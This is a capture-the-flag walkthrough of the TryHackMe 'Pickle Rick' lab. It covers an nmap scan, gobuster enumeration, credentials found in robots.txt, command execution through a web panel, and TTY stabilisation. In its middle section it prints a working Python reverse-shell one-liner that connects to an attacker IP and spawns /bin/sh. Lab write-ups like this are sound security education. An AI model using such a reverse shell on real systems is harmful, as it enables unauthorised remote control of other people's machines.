![[Pasted image 20230504002017.png]]

First ofcourse we gotta connect to the THM VPN, and run the machine

![[Pasted image 20230504002157.png]]

nmap -sC -sV 10.10.221.23
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 12:24 EDT
Nmap scan report for 10.10.221.23
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cfdad871d564e47058315bbd6e6934c3 (RSA)
|   256 8ab625794ac8023b22adef1a1264a631 (ECDSA)
|_  256 8942610675857654d8f6b055a08ba7c3 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.14 seconds

![[Pasted image 20230504002601.png]]
Run nmap, just ssh and http port

![[Pasted image 20230504002244.png]]
Nothing interesting in the front page

![[Pasted image 20230504002313.png]]
We maybe got the usernames
Username: R1ckRul3s

![[Pasted image 20230504002821.png]]
Run gobuster for directory scanning

![[Pasted image 20230504002841.png]]
found a login page



![[Pasted image 20230504002907.png]]
robots.txt give something, could be password

Wubbalubbadubdub

![[Pasted image 20230504002943.png]]

![[Pasted image 20230504003000.png]]
we are in

![[Pasted image 20230504003022.png]]
Only real rick can view other tab, we can only play with commands

![[Pasted image 20230504003100.png]]

we run id command, 

![[Pasted image 20230504003125.png]]
ls command

![[Pasted image 20230504003222.png]]
tried to cat the file can't

![[Pasted image 20230504003153.png]]
uname -a 

let's check if it have python

![[Pasted image 20230504003420.png]]
it does have python, we can try getting reverse shell

![[Pasted image 20230504003655.png]]

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.6.64",9876));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'SS

![[Pasted image 20230504003728.png]]
we got a shell, we can stabalize it
https://0xffsec.com/handbook/shells/full-tty/
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo && fg
reset

![[Pasted image 20230504004828.png]]

now we have stabalize shell, time to find all the ingredients

1. mr. meeseek hair![[Pasted image 20230504004916.png]]
2. 1 jerry tear
![[Pasted image 20230504005032.png]]
3. fleeb juice
   ![[Pasted image 20230504005306.png]]

Thats all for the recipe

![[Pasted image 20230504005405.png]]